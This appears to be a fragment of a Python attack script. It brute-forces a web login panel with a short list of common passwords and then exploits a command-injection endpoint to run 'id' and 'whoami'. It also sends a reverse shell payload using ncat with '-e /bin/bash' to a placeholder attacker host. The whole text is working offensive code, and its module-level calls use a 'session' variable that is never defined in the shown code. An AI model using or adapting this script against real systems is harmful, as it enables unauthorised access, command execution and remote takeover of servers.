def brute_force_login():
    """Brute forces the login panel."""
    session = requests.Session()

    wordlist = ["password", "admin123", "letmein", "qwerty", "12345"]

    for password in wordlist:
        print(f"[*] Trying password: {password}")
        data = {"username": USERNAME, "password": password}
        response = session.post(LOGIN_URL, data=data)

        if "Welcome" in response.text:
            print(f"[+] Login successful! Username: {USERNAME}, Password: {password}")
            return session

    print("[-] Brute force failed.")
    return None

def command_injection(session, command):
    """Exploits command injection by sending a modified drop-down value."""
    response = session.post(EXECUTE_URL, data={"cmd": command})

    if response.status_code == 200:
        print(f"[+] Command Output:\n{response.text}")
    else:
        print("[-] Exploit failed.")

if session:
    command_injection(session, "id")
    command_injection(session, "whoami")


def get_reverse_shell(session, attacker_ip="ATTACKER_IP", attacker_port=4444):
    """Sends a reverse shell payload."""
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"

    print("[+] Sending reverse shell payload...")
    session.post(EXECUTE_URL, data={"cmd": payload})

if session:
    get_reverse_shell(session, "ATTACKER_IP", 4444)
